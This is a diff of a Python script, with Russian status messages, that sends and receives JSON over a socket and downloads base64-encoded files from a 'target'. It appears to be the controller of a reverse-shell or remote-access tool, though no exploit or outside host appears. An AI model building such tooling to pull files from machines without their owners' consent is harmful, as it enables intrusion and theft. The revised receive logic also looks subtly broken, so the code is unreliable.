@@ -19,25 +19,17 @@ def reliable_send(data, sock, binary=False):
         pass
 
 
-def reliable_recv(sock):
+def reliable_recv(sock, binary=False):
     json_data = b""
     while True:
         try:
             chunk = sock.recv(1024)
-            if not chunk:  
-                break
+            if binary:
+                return chunk  
             json_data += chunk
-            if b"EOF" in json_data:  
-                json_data = json_data.replace(b"EOF", b"")
-                break
-            try:
-                result = json.loads(json_data.decode())
-                return result
-            except ValueError:
-                continue
-        except Exception as e:
-            print(f"[!!] Ошибка при приеме данных: {e}")
-            break
+            return json.loads(json_data.decode())
+        except ValueError:
+            continue
 
 
 
@@ -66,17 +58,13 @@ def download_file(command, target):
     try:
         with open(file_name, "wb") as file:
             while True:
-                chunk = reliable_recv(target)
-                if chunk == "EOF": 
+                chunk = reliable_recv(target)  
+                if chunk == "EOF":  
                     break
-                if chunk:
-                    file.write(base64.b64decode(chunk))
+                file.write(base64.b64decode(chunk))  
         print(f"[+] Файл {file_name} успешно загружен.")
     except Exception as e:
-        print(f"[!!] Ошибка при загрузке файла: {e}")
-
-
-
+        print(f"[!!] Ошибка при загрузке файла {file_name}: {e}")
 
 
 def upload_file(command, target):
